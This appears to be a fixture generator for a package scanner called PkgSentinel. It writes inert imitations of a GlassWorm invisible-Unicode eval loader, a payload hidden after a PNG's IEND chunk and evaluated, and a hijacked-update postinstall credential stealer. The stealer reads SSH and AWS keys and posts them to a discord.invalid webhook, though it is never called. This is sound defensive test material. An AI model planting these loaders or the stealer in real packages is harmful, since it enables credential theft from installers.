"""Regenerate test fixtures that contain invisible Unicode.

Everything written here is an INERT fixture. The "malicious" sample copies the
shape of a GlassWorm loader (hidden payload in an empty-looking string, a
decoder, an eval), but the hidden payload only prints a message. Never put
working malware in this repo.

    python tools/make_samples.py
"""

from __future__ import annotations

import json
import struct
import zlib
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent / "test-samples"


def vs_encode(text: str) -> str:
    """Bytes -> variation selectors (U+FE00..FE0F for 0..15, U+E0100.. for 16..255)."""
    return "".join(chr(0xFE00 + b) if b < 16 else chr(0xE0100 + b - 16) for b in text.encode())


def tag_encode(text: str) -> str:
    """ASCII -> Unicode tag characters (U+E0020..E007E)."""
    return "".join(chr(0xE0000 + ord(c)) for c in text)


def zw_encode(text: str) -> str:
    """Bytes -> zero-width binary (ZWSP = 0, ZWNJ = 1)."""
    bits = "".join(f"{b:08b}" for b in text.encode())
    return "".join("‌" if bit == "1" else "​" for bit in bits)


def png(width: int = 16, height: int = 16, extra_chunks: list[tuple[bytes, bytes]] = ()) -> bytes:
    """A small valid RGB PNG (a gradient), built with the stdlib only."""
    def chunk(ctype: bytes, body: bytes) -> bytes:
        return struct.pack(">I", len(body)) + ctype + body + struct.pack(">I", zlib.crc32(ctype + body))

    rows = b"".join(
        b"\x00" + bytes(v for x in range(width) for v in (x * 16 % 256, y * 16 % 256, 128))  # filter 0 + RGB
        for y in range(height)
    )
    out = b"\x89PNG\r\n\x1a\n" + chunk(b"IHDR", struct.pack(">IIBBBBB", width, height, 8, 2, 0, 0, 0))
    for ctype, body in extra_chunks:
        out += chunk(ctype, body)
    return out + chunk(b"IDAT", zlib.compress(rows)) + chunk(b"IEND", b"")


def write_bytes(path: Path, content: bytes) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_bytes(content)
    print(f"wrote {path.relative_to(ROOT.parent)}")


def write(path: Path, content: str) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(content, encoding="utf-8")
    print(f"wrote {path.relative_to(ROOT.parent)}")


def glassworm_demo() -> None:
    d = ROOT / "malicious" / "glassworm-demo"
    write(d / "package.json", json.dumps({
        "name": "glassworm-demo",
        "version": "1.0.0",
        "description": "PkgSentinel test fixture (inert). Mimics a GlassWorm loader.",
        "main": "index.js",
        "license": "MIT",
    }, indent=2) + "\n")

    # The payload references credential paths so code_scan has something to
    # find once it rescans the decoded text, but all it does is log a string.
    payload = (
        'console.log("[pkgsentinel fixture] hidden code ran. A real worm would now read " '
        '+ require("os").homedir() + "/.ssh/id_rsa and POST it to https://exfil.invalid/");'
    )
    write(d / "index.js", (
        "// PKGSENTINEL TEST FIXTURE: inert. Copies the GlassWorm loader shape.\n"
        "// The string below looks empty in every editor. It is not.\n"
        "\n"
        f'const settings = "{vs_encode(payload)}";\n'
        "\n"
        "const s = (v) => [...v].map((c) => {\n"
        "  const p = c.codePointAt(0);\n"
        "  return p >= 0xE0100 ? p - 0xE0100 + 16 : p - 0xFE00;\n"
        "});\n"
        "\n"
        "eval(Buffer.from(s(settings)).toString(\"utf8\"));\n"
        "\n"
        "module.exports = { ready: true };\n"
    ))

    # Tag characters hidden at the end of an innocent comment (never executed).
    write(d / "lib" / "config.py", (
        "# PKGSENTINEL TEST FIXTURE: inert.\n"
        f"# default settings{tag_encode('import os; os.system(\"echo pkgsentinel-fixture\")')}\n"
        "DEBUG = False\n"
    ))

    # Zero-width binary text in prose: not code, so this should stay low severity.
    write(d / "README.md", (
        "# glassworm-demo\n\n"
        f"PkgSentinel test fixture.{zw_encode('fixture watermark 42')} Do not install.\n"
    ))


def emoji_utils() -> None:
    """Benign package full of legitimate invisible codepoints. Must scan clean."""
    d = ROOT / "benign" / "emoji-utils"
    write(d / "package.json", json.dumps({
        "name": "emoji-utils",
        "version": "2.1.0",
        "description": "PkgSentinel test fixture (benign): legit Unicode that must not flag.",
        "main": "index.js",
        "license": "MIT",
    }, indent=2) + "\n")

    write(d / "index.js", (
        "﻿// Starts with a BOM, which is fine.\n"
        "const VS16 = 0xfe0f; // emoji presentation selector\n"
        "const strip = (s) => s.replace(/\\uFE0F/g, \"\");\n"
        "const root = Function(\"return this\")(); // common globalThis polyfill\n"
        "\n"
        "const samples = {\n"
        '  heart: "❤️",                                  // ❤ + VS16\n'
        '  family: "\U0001F468‍\U0001F469‍\U0001F467",   // ZWJ sequence\n'
        '  rainbow: "\U0001F3F3️‍\U0001F308",            // VS16 + ZWJ\n'
        '  keycap: "1️⃣",\n'
        '  england: "\U0001F3F4' + tag_encode("gbeng") + '\U000E007F",  // subdivision flag\n'
        '  kanji: "葛\U000E0100",                               // ideographic variant\n'
        '  hindi: "क्‍ष",                        // ZWJ in Devanagari\n'
        '  persian: "می‌خواهم",  // ZWNJ in Persian\n'
        "};\n"
        "\n"
        "module.exports = { samples, strip, VS16, root };\n"
    ))

    write(d / "icons.css", (
        "/* icon font glyphs written as literal private-use characters */\n"
        '.icon-home::before { content: ""; }\n'
        '.icon-user::before { content: ""; }\n'
    ))

    write(d / "README.md", (
        "# emoji-utils\n\n"
        "Handles emoji like ❤️ and \U0001F468‍\U0001F469‍\U0001F467.\n\n"
        "Arabic example: ⁧مرحبا⁩ (wrapped in a bidi isolate).\n"
    ))


def stego_demo() -> None:
    """Payload appended after a PNG's IEND chunk, plus the loader that slices it off."""
    d = ROOT / "malicious" / "stego-demo"
    write(d / "package.json", json.dumps({
        "name": "stego-demo",
        "version": "1.2.0",
        "description": "PkgSentinel test fixture (inert). Code hidden after a PNG's IEND chunk.",
        "main": "index.js",
        "license": "MIT",
    }, indent=2) + "\n")
    payload = ('console.log("[pkgsentinel fixture] code hidden inside banner.png ran. A real loader would "'
               ' + "now read " + require("os").homedir() + "/.aws/credentials");\n')
    write_bytes(d / "assets" / "banner.png", png() + payload.encode())
    write(d / "index.js", (
        "// PKGSENTINEL TEST FIXTURE: inert. Copies the shape of an image-stego loader.\n"
        "// Image viewers stop at IEND; everything after it is invisible but still in the file.\n"
        'const fs = require("fs");\n'
        'const path = require("path");\n'
        "\n"
        'const img = fs.readFileSync(path.join(__dirname, "assets", "banner.png"));\n'
        'const end = img.indexOf("IEND") + 8;\n'
        'eval(img.subarray(end).toString("utf8"));\n'
    ))


def clean_images() -> None:
    """A normal logo with ordinary metadata (Software tag + XMP). Must scan clean."""
    xmp = ('<x:xmpmeta xmlns:x="adobe:ns:meta/"><rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">'
           '<rdf:Description xmlns:xmp="http://ns.adobe.com/xap/1.0/" xmp:CreatorTool="Inkscape"/>'
           "</rdf:RDF></x:xmpmeta>")
    write_bytes(ROOT / "benign" / "clean-math" / "assets" / "logo.png", png(extra_chunks=[
        (b"tEXt", b"Software\0PkgSentinel fixture generator"),
        (b"iTXt", b"XML:com.adobe.xmp\0\0\0\0\0" + xmp.encode()),
    ]))


UPDATE_DEMO_LIB = (
    "// update-demo: tiny string helpers.\n"
    "function slugify(s) {\n"
    "  return s.toLowerCase().trim().replace(/[^a-z0-9]+/g, \"-\").replace(/^-|-$/g, \"\");\n"
    "}\n"
    "\n"
    "function titleCase(s) {\n"
    "  return s.replace(/\\b\\w/g, (c) => c.toUpperCase());\n"
    "}\n"
    "\n"
    "module.exports = { slugify, titleCase };\n"
)


def diff_demo() -> None:
    """A clean release and a hijacked patch release of the same library.

    1.0.1 keeps index.js byte-identical, then adds a postinstall hook, an inert
    credential stealer and a new dependency: the shape of real hijacked updates
    (event-stream / flatmap-stream, ua-parser-js, coa/rc)."""
    base = ROOT / "diff"
    for version in ("1.0.0", "1.0.1"):
        d = base / f"update-demo-{version}"
        manifest = {
            "name": "update-demo",
            "version": version,
            "description": "PkgSentinel test fixture: version-diff demo (inert).",
            "main": "index.js",
            "license": "MIT",
            "dependencies": {"left-pad": "^1.3.0"},
        }
        if version == "1.0.1":
            manifest["scripts"] = {"postinstall": "node scripts/setup.js"}
            manifest["dependencies"]["flatmap-stream"] = "0.1.1"
        write(d / "package.json", json.dumps(manifest, indent=2) + "\n")
        write(d / "index.js", UPDATE_DEMO_LIB)

    write(base / "update-demo-1.0.1" / "scripts" / "setup.js", (
        "// PKGSENTINEL TEST FIXTURE: inert. The 'hijacked update' half of the diff demo.\n"
        "// main() is never called; the webhook is on the reserved .invalid TLD.\n"
        'const fs = require("fs");\n'
        'const os = require("os");\n'
        'const path = require("path");\n'
        'const https = require("https");\n'
        "\n"
        'const HOOK = "https://discord.invalid/api/webhooks/987654321098765432/FIXTURE-not-a-real-token-1111";\n'
        "\n"
        "function main() {\n"
        "  const loot = {};\n"
        '  for (const f of [path.join(os.homedir(), ".ssh", "id_rsa"), path.join(os.homedir(), ".aws", "credentials")]) {\n'
        '    try { loot[f] = fs.readFileSync(f, "utf8"); } catch (e) {}\n'
        "  }\n"
        '  const req = https.request(HOOK, { method: "POST" });\n'
        "  req.end(JSON.stringify(loot));\n"
        "}\n"
        "\n"
        "// main();  <- deliberately never called\n"
    ))


if __name__ == "__main__":
    glassworm_demo()
    emoji_utils()
    stego_demo()
    clean_images()
    diff_demo()
